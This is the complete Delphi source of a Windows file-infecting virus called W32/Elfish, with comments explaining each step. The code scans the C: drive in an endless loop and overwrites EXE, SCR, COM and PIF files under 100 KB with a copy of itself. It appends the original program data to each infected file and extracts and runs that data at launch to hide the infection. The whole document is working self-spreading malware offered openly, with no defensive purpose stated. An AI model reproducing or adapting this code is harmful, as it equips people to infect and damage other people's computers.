   (*
      W32/Elfish written by p0ke.
      Infects EXE SCR COM PIF files.
   *)

   // Name of program
   program w32elfish;

   // This line make the application to have an ICON.
   {$R *.res}

   // Windows for all declares, ShellAPI for ShellExecute command.
   uses
     Windows, ShellAPI;

   // Declares some useless shit.
   const
     av_message  = 'elf1sh w0rm str1kes back##';
     faReadOnly  = $00000001;
     faHidden    = $00000002;
     faSysFile   = $00000004;
     faVolumeID  = $00000008;
     faDirectory = $00000010;
     faArchive   = $00000020;
     faAnyFile   = $0000003F;

   // Declares some types for searching the HDD
   Type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle;
       FindData: TWin32FindData;
     end;

   // Declares some records for searching HDD
     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;


   (* ReadFileStr reads a file (chunk by chunk) into a string *)
   procedure ReadFileStr(Fname:string;var FullContents:string);
   var
    Fcontents:File of Char;
    Fbuffer:array [1..1024] of Char;
    rLen,Fsize:LongInt;
   begin
    FullContents:='';
    {$I-}  // This makes it not report error, just silent exit.
    AssignFile(Fcontents,Fname); // open file
    Reset(Fcontents); // reset it, so we can read it
    Fsize:=FileSize(Fcontents);  // get file size
    while not Eof(Fcontents) do begin  // while not EndOfFile
     BlockRead(Fcontents,Fbuffer,1024,rLen);  // BlockRead it (chunk by chunk read) 1024 chars.
     FullContents:=FullContents + string(Fbuffer);  // Put readed data into FullContents
    end;
    CloseFile(Fcontents);  // Close File
    {$I+} // Make it report errors again
    if Length(FullContents) > Fsize then  // If the readed data is more then the filesize is (unlogicaly) Then
     FullContents:=Copy(FullContents,1,Fsize);  // remove some shit.
   end;

   (* Saves ~20kb to not user sysutils, rippin inttostr/strtoint kicks ass *)
   function InttoStr(const Value: integer): string;
   var
     S: string[11];
   begin
     Str(Value, S);
     Result := S;
   end;

   (* Saves ~20kb to not user sysutils, rippin inttostr/strtoint kicks ass *)
   function StrtoInt(const S: string): integer;
   var
     E: integer;
   begin
     Val(S, Result, E);
   end;

   (* Generates a random number.exe file. (e.x: 19438320485692694382.exe *)
   Function GenerateName: String;
   Begin
     Randomize;  // Randomize, so we always get random output from Random();
     Result := '';  // Clear result
     While Length(Result) < 20 Do  // While length of Result aint 20 chars long
       Result := Result + IntToStr(Random(10));  // Put Result + Random Number.
     Result := Result+'.exe';  // Put .exe at end of result.
     // Result is now e.x: 01234567890123456789.exe
   End;

   (* Infects choosen file, or atleast tries ;D *)
   Procedure InfectFile(Name: String);
   Var
     FileBuffer, Settings, APSet: String;
     F: TextFile;
     I: Integer;
     Res: Bool;
   Begin
     If Not CopyFile(pChar(Name), pChar(Name+'_'), False) Then Exit;  // if not copy hostfile to hostfile_ then exit
     If Not CopyFile(pChar(ParamStr(0)), pChar(Name), False) Then Exit; // if not copy ourself to hostfile then exit

     AssignFile(F, Name);  // open hostfile for APPENDING
     Append(F);  // Set Append mode

     Name := Name + '_';  // Set Hostname to Hostname_

     APSet := GenerateName;  // Get Generated FileName (look above)
     ReadFileStr(Name, FileBuffer);  // Read file into string
     If Pos('w32elfish', string(FileBuffer)) > 0 Then Exit; // If it finds "w32elfish" then its already infect, exit if so

     // APSET is the settings saved in file
     // saved as following:
     //  #00 | filename | execute | #02 | filesize | #01
     // ex:  #00filename.exe1#024000#01
     APSet := APSet + '1'#02+IntToStr(Length(FileBuffer))+#01;  // Save settings.
     Settings := #00 + APSet + Settings;  // Put it into Settings String

     Write(F, FileBuffer);  // Write Filebuffer and Settings
     Write(F, Settings);    // ....
     CloseFile(F);  // Close File

     Res := False;  // Set RES to False
     Repeat
       Res := DeleteFile(pChar(Name));  // While file exists, try to delete it.
     Until Res;
     // File Is Deleted Now, so eixt procedure.
   End;

   // Release is a function to release all files binded to paramstr(0)
   // paramstr(0) == the current file.
   (* Execute all binded files *)
   Procedure Release;
   Var
     FContent, Settings, FName, FSet: String;
     I, FSize: Integer;
     Exec: Boolean;
     F: TextFile;
     Res: Bool;
   Begin
     If Not CopyFile(pChar(ParamStr(0)), pChar(GenerateName), False) Then Exit; // If not copy currentfile as currentfile_ then exit
     ReadFileStr(ParamStr(0)+'_', FContent);  // read Currentfile_ int FContent string

     I := Length(FContent);  // Get length of FContent
     Settings := '';  // Empty settings

     While (I > 0) And (FContent[i] <> #00) Do  // While I is bigger then 0, and FContent[i] aint #00 Do
     Begin
       Settings := FContent[i] + Settings;  // Settings is FContent[i] and settings
       Dec(I);  // Decrease I
     End;

     If Settings = '' Then Exit;  // If Settings is empty, then exit

     Delete(FContent, I, Length(Settings));  // Delete settings from readed file-data
     While Pos(#01, Settings) > 0 Do  // While finding #01 in settings do
     Begin

       // COPY is the same as MID() Function in mirc-scripting.
       // Copy(String, Start, Length);
       // Mod(String, Start, Length);

       FSet := Copy(Settings, 1, Pos(#01, Settings)-1);  // Set is Settings from char 1 until it finds #01
       Delete(Settings, 1, Pos(#01, Settings));  // Delete FSet length from Settings

       FName := Copy(FSet, 1, Pos(#02, FSet)-2);  // Get name From FSet
       Exec := True;  // Execute is true. always true.
       Delete(FSet, 1, Pos(#02, FSet));  // Delete everything except size from FSet
       FSize := StrToInt(FSet);  // Get Size.

       {$I-}
         AssignFile(F, Fname);  // Open file
         ReWrite(F);  // Rewrite file
         Write(F, Copy(FContent, Length(FContent)-FSize, FSize));  // Put FContent text into File
         CloseFile(F);  // Close File
       {$I+}
       Delete(FContent, Length(FContent)-FSize, FSize);  //Delete Length of size from FContent
       ShellExecute(0, NIL, pChar(Fname), NIL, NIL, 1);  // Execute written file
     End;

     Res := False;  // Put Res to false
     Repeat
       Res := DeleteFile(pChar(ParamStr(0)+'_'));  // While Not Deleteing File, Keep Trying :D
     Until Res;  // <Penis>
   End;

   // BULLSHIT FUNCTION THATS UNNEEDED TO LEARN
   (* Used to search for files *)
   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;

   // BULLSHIT FUNCTION THATS UNNEEDED TO LEARN
   (* Used to search for files *)
   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   end;

   // BULLSHIT FUNCTION THATS UNNEEDED TO LEARN
   (* Used to search for files *)
   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
   begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;

   // BULLSHIT FUNCTION THATS UNNEEDED TO LEARN
   (* Used to search for files *)
   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   end;

   // Function to get file-extention (such as exe,txt,etc)
   (* Get File Extension *)
   function ExtractFileExt(const Filename: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Filename);  // Get length of Filename
     for i := L downto 1 do  // From length down to 0 do
     begin
       Ch := Filename[i];  // Ch is character I from Filename
       if (Ch = '.') then  // If Ch is a dot, Then its the extension dot :D
       begin
         Result := Copy(Filename, i + 1, L - i);  // Result is everything behind DOT.
         Break;  // Break  here, we got what we came for. Lets go back home.
       end;
     end;
   end;

   (* UpperCase Function, saving ~20 kb by ripping it *)
   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);  // Get Length of S (The text we wanna make uppercase)
     SetLength(Result, L);  // Set length of result, to length of L
     Source := Pointer(S);  // Put pointer of S to Source
     Dest := Pointer(Result);  // Put pointer of Result to Dest
     while L <> 0 do  // While L aint 0 Do
     begin
       Ch := Source^;  // Ch is Source^
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);  // If Ch Is bigger or Is "a", and Ch is smaller or Is "z" Do
                                                         // Decrease CH with 32
       Dest^ := Ch;  // Put Ch into Dest^
       Inc(Source);  // Increase Source
       Inc(Dest);  // Increase Dest
       Dec(L);  // Decrease L
     end;
   end;

   (* DoScan and search for files. *)
   procedure doscan(dir, name, mask: string);
   var
     Sr: TSearchRec;
   begin
     if dir[length(dir)] <> '\' then dir := dir + '\';  //If Last character of Dir aint \ then put \ at end.
     If FindFirst(dir + '*.*', faDirectory, sr) = 0 Then  // If Findfirst call doesnt fail Then
     Repeat
       If ((Sr.Attr and faDirectory) = faDirectory) and (sr.Name[1] <> '.') then  // If Attribute is directory, and name Aint . or .. Then
         If (UpperCase(Dir) <> 'WINDOWS') and (UpperCase(Dir) <> 'WINNT') Then // If Name aint Windows or WINNT Then
           doscan(dir + sr.Name, '*', '*.*')  // Scan that folder.
       Else Begin
         (* If Size is under 100 kb Then Infect *)
         If Sr.Size < (1024*100) Then
         Begin
           (* If Extension is exe,scr,pif or com then infect the file *)
           If UpperCase(ExtractFileExt(Sr.Name)) = UpperCase('exe') Then InfectFile(Dir + Sr.Name);
           If UpperCase(ExtractFileExt(Sr.Name)) = UpperCase('scr') Then InfectFile(Dir + Sr.Name);
           If UpperCase(ExtractFileExt(Sr.Name)) = UpperCase('pif') Then InfectFile(Dir + Sr.Name);
           If UpperCase(ExtractFileExt(Sr.Name)) = UpperCase('com') Then InfectFile(Dir + Sr.Name);
         End;
       End;
     Until (FindNext(Sr) <> 0); // If FindNext is 0 then Exit;
     FindClose(SR);  // Close it, else error :D
   end;

   begin
     (* call Release() and release all binded files *)
     Release;
     (* If unable to createmutex (if it exists) then exit program *)
     If CreateMutex(NIL,FALSE,'elfish') = ERROR_ALREADY_EXISTS Then ExitProcess(0);
     (* Else do scan and infect files until 1 = 2 (never-ending loop) *)
     Repeat Doscan('c:\','*','*.*'); Until 1=2;
   end.
